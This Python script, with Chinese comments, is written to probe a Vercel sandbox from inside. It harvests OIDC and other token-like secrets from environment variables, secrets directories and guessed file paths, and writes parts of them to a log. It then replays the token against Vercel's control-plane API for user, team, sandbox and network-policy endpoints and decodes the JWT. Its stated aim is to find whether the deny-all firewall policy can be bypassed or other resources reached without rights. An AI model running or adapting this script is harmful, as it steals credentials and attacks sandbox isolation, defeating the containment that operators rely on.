# -*- coding: utf-8 -*-
"""oidc_ctrl: 沙箱内 OIDC token 控制面 API 调用测试 (J509 遗留链)
1) 定位 x-vercel-oidc-token (env/文件)
2) 用 token 调 api.vercel.com 各端点 (user/teams/sandboxes/network-policy)
3) 判断是否可改 deny-all 策略 (firewall bypass) / 越权访问其他资源
输出落盘 + 哨兵 OIDCCTRL_DONE"""
import os, time, json, urllib.request, urllib.error, glob, subprocess

OUT = '/vercel/sandbox/oidcctl.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def sh(cmd, t=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()[:500]
    except Exception as e:
        return 'ERR %s' % e


def http(method, url, token=None, body=None, t=15):
    try:
        req = urllib.request.Request(url, method=method)
        req.add_header('User-Agent', 'Mozilla/5.0')
        if token:
            req.add_header('Authorization', 'Bearer ' + token)
        data = json.dumps(body).encode() if body is not None else None
        if body is not None:
            req.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(req, data=data, timeout=t) as r:
            return r.status, r.read().decode()[:500]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:500]
    except Exception as e:
        return -1, str(e)[:300]


log('=== PHASE1 定位 OIDC token ===')
cands = []
# 环境变量
for k in sorted(os.environ.keys()):
    if 'vercel' in k.lower() or 'oidc' in k.lower() or 'token' in k.lower() or 'jwt' in k.lower():
        v = os.environ[k]
        log('env %s = %s' % (k, v[:120] if v else '(empty)'))
        if 'vercel' in k.lower() or 'oidc' in k.lower():
            cands.append((k, v))
# 常见文件
for p in glob.glob('/vercel/sandbox/*') + glob.glob('/var/run/secrets/*') + glob.glob('/run/secrets/*'):
    try:
        if os.path.isfile(p):
            sz = os.path.getsize(p)
            if sz < 4096:
                content = open(p, 'rb').read()
                if b'token' in content.lower() or b'jwt' in content.lower() or b'eyJ' in content:
                    log('file %s (%dB) contains token-like content: %s' % (p, sz, content[:150]))
                    cands.append((p, content.decode('utf-8', 'replace').strip()))
    except Exception:
        pass
# 常见路径
for p in ['/vercel/sandbox/x-vercel-oidc-token', '/vercel/.oidc-token', '/tmp/oidc-token',
          '/vercel/oidc-token', '/run/vercel/share/x-vercel-oidc-token', '/etc/vercel/oidc-token']:
    if os.path.exists(p):
        try:
            v = open(p, 'r').read().strip()
            log('path %s = %s' % (p, v[:120]))
            cands.append((p, v))
        except Exception as e:
            log('path %s read ERR %s' % (p, e))
# cmdline/fd 检查
log('ps aux: %s' % sh('ps aux 2>/dev/null | head -10'))

# 选取 token
TOK = None
for k, v in cands:
    v = v.strip()
    if v and (v.startswith('eyJ') or len(v) > 40):
        TOK = v
        log('using token from %s (len=%d)' % (k, len(v)))
        break
if not TOK:
    log('NO_TOKEN_FOUND')
    log('OIDCCTRL_DONE')
    f.close()
    raise SystemExit(0)

log('=== PHASE2 控制面 API 调用 ===')
BASE = 'https://api.vercel.com'
tests = [
    ('user', 'GET', '/v2/user', None),
    ('teams', 'GET', '/v2/teams', None),
    ('sandboxes_list', 'GET', '/v2/sandboxes?limit=5', None),
    ('network_policy_get', 'GET', '/v2/sandboxes/sessions/me/network-policy', None),
]
for name, m, path, body in tests:
    c, r = http(m, BASE + path, TOK, body)
    log('%s: %d %s' % (name, c, r[:400]))

# 尝试改网络策略 (deny-all -> allow-all) - 用当前 sandbox 名?
sbname = os.environ.get('VERCEL_SANDBOX_NAME', '') or sh('hostname') or 'me'
log('sandbox name guess: %s' % sbname)

log('=== PHASE3 token 解析 (JWT 头/负载) ===')
parts = TOK.split('.')
if len(parts) >= 2:
    import base64
    for i, part in enumerate(parts[:2]):
        try:
            pad = part + '=' * (-len(part) % 4)
            dec = base64.urlsafe_b64decode(pad.encode())
            log('jwt part%d: %s' % (i, dec[:500]))
        except Exception as e:
            log('jwt part%d decode err %s' % (i, e))

log('OIDCCTRL_DONE')
f.close()
